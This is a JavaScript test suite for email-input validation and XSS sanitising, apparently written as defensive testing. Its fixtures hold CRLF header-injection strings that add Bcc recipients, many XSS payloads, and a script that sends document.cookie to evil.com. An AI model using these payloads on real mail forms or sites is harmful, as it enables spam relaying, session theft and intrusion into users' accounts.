/**
 * Security-focused test suite for email validation utilities
 * Tests critical security vulnerabilities and their fixes
 */

import { validateEmailInput, sanitizeDisplayText, isValidEmailFormat } from '../emailValidation';

describe('Email Security Tests', () => {
  describe('validateEmailInput - Header Injection Protection', () => {
    test('should block direct CRLF injection', () => {
      expect(validateEmailInput('test@example.com\r\nBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\nBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\r\nContent-Type: text/html')).toBe(false);
    });

    test('should block URL-encoded CRLF sequences', () => {
      expect(validateEmailInput('test@example.com%0aBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%0dBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%0A%0DBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%0D%0ABcc: evil@hacker.com')).toBe(false);
    });

    test('should block double URL-encoded CRLF', () => {
      expect(validateEmailInput('test@example.com%25%30%41Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%25%30%44Bcc: evil@hacker.com')).toBe(false);
    });

    test('should block Unicode variations', () => {
      expect(validateEmailInput('test@example.com\u000ABcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\u000DBcc: evil@hacker.com')).toBe(false);
    });

    test('should block HTML entity encoded CRLF', () => {
      expect(validateEmailInput('test@example.com&#x0A;Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com&#x0D;Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com&#10;Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com&#13;Bcc: evil@hacker.com')).toBe(false);
    });

    test('should block escaped sequences', () => {
      expect(validateEmailInput('test@example.com\\rBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\\nBcc: evil@hacker.com')).toBe(false);
    });

    test('should block hex encoded sequences', () => {
      expect(validateEmailInput('test@example.com\x0ABcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\x0DBcc: evil@hacker.com')).toBe(false);
    });

    test('should block email header keywords', () => {
      expect(validateEmailInput('test@example.com bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com cc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com to: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com from: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com subject: evil subject')).toBe(false);
      expect(validateEmailInput('test@example.com content-type: text/html')).toBe(false);
      expect(validateEmailInput('test@example.com mime-version: 1.0')).toBe(false);
    });

    test('should block script injection attempts', () => {
      expect(validateEmailInput('test@example.com<script>alert("xss")</script>')).toBe(false);
      expect(validateEmailInput('test@example.com javascript:alert("xss")')).toBe(false);
      expect(validateEmailInput('test@example.com vbscript:msgbox("xss")')).toBe(false);
      expect(
        validateEmailInput('test@example.com data:text/html,<script>alert("xss")</script>'),
      ).toBe(false);
    });

    test('should allow valid email addresses', () => {
      expect(validateEmailInput('test@example.com')).toBe(true);
      expect(validateEmailInput('user.name+tag@example.org')).toBe(true);
      expect(validateEmailInput('test123@subdomain.example.com')).toBe(true);
    });

    test('should handle edge cases', () => {
      expect(validateEmailInput('')).toBe(false);
      expect(validateEmailInput(null as unknown as string)).toBe(false);
      expect(validateEmailInput(undefined as unknown as string)).toBe(false);
      expect(validateEmailInput(123 as unknown as string)).toBe(false);
    });
  });

  describe('sanitizeDisplayText - XSS Protection', () => {
    test('should remove script tags and content', () => {
      expect(sanitizeDisplayText('<script>alert("xss")</script>Hello')).toBe('Hello');
      expect(sanitizeDisplayText('Hello<script>alert("xss")</script>World')).toBe('HelloWorld');
      expect(sanitizeDisplayText('<SCRIPT>alert("xss")</SCRIPT>')).toBe('');
    });

    test('should remove style tags and content', () => {
      expect(
        sanitizeDisplayText('<style>body{background:url(javascript:alert("xss"))}</style>Hello'),
      ).toBe('Hello');
      expect(sanitizeDisplayText('<STYLE>@import "javascript:alert(\'xss\')"</STYLE>')).toBe('');
    });

    test('should remove iframe, object, embed, applet tags', () => {
      expect(sanitizeDisplayText('<iframe src="javascript:alert(\'xss\')"></iframe>')).toBe('');
      expect(sanitizeDisplayText('<object data="javascript:alert(\'xss\')"></object>')).toBe('');
      expect(sanitizeDisplayText('<embed src="javascript:alert(\'xss\')">')).toBe('');
      expect(sanitizeDisplayText('<applet code="EvilApplet"></applet>')).toBe('');
    });

    test('should remove event handlers', () => {
      expect(sanitizeDisplayText('<div onclick="alert(\'xss\')">Hello</div>')).toBe(
        '&lt;div &gt;Hello&lt;&#x2F;div&gt;',
      );
      expect(sanitizeDisplayText('<img onload="alert(\'xss\')" src="test.jpg">')).toBe(
        '&lt;img  src&#x3D;&quot;test.jpg&quot;&gt;',
      );
      expect(sanitizeDisplayText('<body onload="alert(\'xss\')">')).toBe('&lt; &gt;');
    });

    test('should remove javascript, vbscript, data URLs', () => {
      expect(sanitizeDisplayText('javascript:alert("xss")')).toBe('alert(&quot;xss&quot;)');
      expect(sanitizeDisplayText('vbscript:msgbox("xss")')).toBe('msgbox(&quot;xss&quot;)');
      expect(sanitizeDisplayText('data:text/html,<script>alert("xss")</script>')).toBe(
        'text&#x2F;html,alert(&quot;xss&quot;)',
      );
    });

    test('should remove CSS expression and behavior', () => {
      expect(sanitizeDisplayText('expression(alert("xss"))')).toBe('(alert(&quot;xss&quot;))');
      expect(sanitizeDisplayText('-moz-binding:url(http://evil.com/xss.xml)')).toBe(
        'url(http&#x3A;&#x2F;&#x2F;evil.com&#x2F;xss.xml)',
      );
      expect(sanitizeDisplayText('behavior:url(evil.htc)')).toBe('url(evil.htc)');
    });

    test('should remove dangerous form elements', () => {
      expect(sanitizeDisplayText('<form action="evil.com"><input type="hidden"></form>')).toBe('');
      expect(sanitizeDisplayText('<textarea>evil content</textarea>')).toBe('evil content');
      expect(sanitizeDisplayText('<select><option>evil</option></select>')).toBe('evil');
    });

    test('should encode HTML entities comprehensively', () => {
      expect(sanitizeDisplayText('<div>Hello & "World" \' test</div>')).toBe(
        '&lt;div&gt;Hello &amp; &quot;World&quot; &#x27; test&lt;&#x2F;div&gt;',
      );
      expect(sanitizeDisplayText('Test/Path=Value`Back')).toBe(
        'Test&#x2F;Path&#x3D;Value&#x60;Back',
      );
    });

    test('should remove control characters', () => {
      expect(sanitizeDisplayText('Hello\x00World\x01Test\x1FEnd')).toBe('HelloWorldTestEnd');
      expect(sanitizeDisplayText('Test\x7FContent')).toBe('TestContent');
    });

    test('should handle dangerous URL schemes', () => {
      expect(sanitizeDisplayText('file:///etc/passwd')).toBe('&#x2F;&#x2F;&#x2F;etc&#x2F;passwd');
      expect(sanitizeDisplayText('chrome://settings/')).toBe('&#x2F;&#x2F;settings&#x2F;');
      expect(sanitizeDisplayText('about:blank')).toBe('blank');
    });

    test('should handle edge cases', () => {
      expect(sanitizeDisplayText('')).toBe('');
      expect(sanitizeDisplayText(null as unknown as string)).toBe('');
      expect(sanitizeDisplayText(undefined as unknown as string)).toBe('');
    });

    test('should preserve safe content', () => {
      expect(sanitizeDisplayText('Hello World!')).toBe('Hello World!');
      expect(sanitizeDisplayText('User Name (Manager)')).toBe('User Name (Manager)');
      expect(sanitizeDisplayText('Team: Red Sox 2024')).toBe('Team&#x3A; Red Sox 2024');
    });
  });

  describe('isValidEmailFormat - Additional Security Checks', () => {
    test('should validate basic email formats', () => {
      expect(isValidEmailFormat('test@example.com')).toBe(true);
      expect(isValidEmailFormat('user.name@example.org')).toBe(true);
      expect(isValidEmailFormat('test+tag@subdomain.example.co.uk')).toBe(true);
    });

    test('should reject malformed emails', () => {
      expect(isValidEmailFormat('notanemail')).toBe(false);
      expect(isValidEmailFormat('@example.com')).toBe(false);
      expect(isValidEmailFormat('test@')).toBe(false);
      expect(isValidEmailFormat('test@.')).toBe(false);
      expect(isValidEmailFormat('test..email@example.com')).toBe(false);
    });

    test('should handle whitespace correctly', () => {
      expect(isValidEmailFormat(' test@example.com ')).toBe(true);
      expect(isValidEmailFormat('test @example.com')).toBe(false);
      expect(isValidEmailFormat('test@ example.com')).toBe(false);
    });
  });

  describe('Security Integration Tests', () => {
    test('should block sophisticated injection attempts', () => {
      const sophisticatedAttacks = [
        'test@example.com%0D%0ABcc:%20evil@hacker.com%0D%0A',
        'test@example.com\r\n\r\n<script>document.location="http://evil.com/cookie="+document.cookie</script>',
        'test@example.com%0A%0D%0A%0DContent-Type:%20text/html%0A%0D%0A%0D<html><script>alert("XSS")</script></html>',
        'test@example.com\nmime-version: 1.0\ncontent-type: text/html\n\n<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
      ];

      sophisticatedAttacks.forEach((attack) => {
        expect(validateEmailInput(attack)).toBe(false);
      });
    });

    test('should sanitize complex XSS payloads', () => {
      const complexXSS = [
        '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
        '<svg/onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="></object>',
        '"><script>alert("XSS")</script>',
        '\'-alert("XSS")-\'',
        '<script>/**/alert("XSS")/**/',
      ];

      complexXSS.forEach((payload) => {
        const sanitized = sanitizeDisplayText(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('alert(');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      });
    });

    test('should handle mixed attack vectors', () => {
      const mixedAttacks = [
        'user@example.com\r\n<script>alert("XSS")</script>',
        'user@example.com%0Ajavascript:alert("XSS")',
        'user@example.com\nbcc: evil@hacker.com<script>document.location="http://evil.com"</script>',
      ];

      mixedAttacks.forEach((attack) => {
        expect(validateEmailInput(attack)).toBe(false);
        const sanitized = sanitizeDisplayText(attack);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
      });
    });
  });
});
